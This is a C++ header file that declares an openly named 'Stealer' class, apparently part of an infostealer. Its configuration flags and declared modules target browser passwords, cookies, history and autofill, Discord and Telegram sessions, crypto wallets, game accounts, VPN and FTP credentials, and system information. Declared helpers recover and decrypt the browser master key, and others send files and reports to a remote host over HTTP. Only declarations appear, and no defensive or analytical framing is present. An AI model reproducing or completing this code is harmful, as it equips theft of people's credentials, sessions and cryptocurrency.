#pragma once
#include <windows.h>
#include <string>
#include <vector>

struct StealerConfig {
    bool passwords;
    bool cookies;
    bool history;
    bool autofills;
    bool discord;
    bool telegram;
    bool wallets;
    bool games;
    bool sysinfo;
    bool vpns;
    bool ftp;
};

class Stealer {
public:
    static void Run(const std::string& configJson);

private:
    // Core Modules
    static void StealBrowsers();
    static void StealCommunication();
    static void StealWallets();
    static void StealGames();
    static void StealTelegram();
    static void StealSystemInfo();
    static void StealVPNs();
    static void StealFTP();
    
    // Helpers
    static void SendLog(const std::string& msg);
    static StealerConfig ParseConfig(const std::string& json);
    static bool Contains(const std::string& str, const std::string& sub);
    
    // Advanced Helpers (Perfection)
    static std::string GetMasterKey(const std::string& localStatePath);
    static std::string DecryptKey(const std::vector<BYTE>& encrypted);
    static std::vector<std::string> ListSubDirectories(const std::string& path);
    static std::string GetRegistryString(HKEY hKeyRoot, const char* subKey, const char* valueName);
    
    static void SendFile(const std::string& cat, const std::string& name, const std::string& path);
    static void SendReport(const std::string& cat, const std::string& name, const std::string& content);
    static std::string HTTPGet(std::wstring domain, std::wstring path, std::string token = "");
};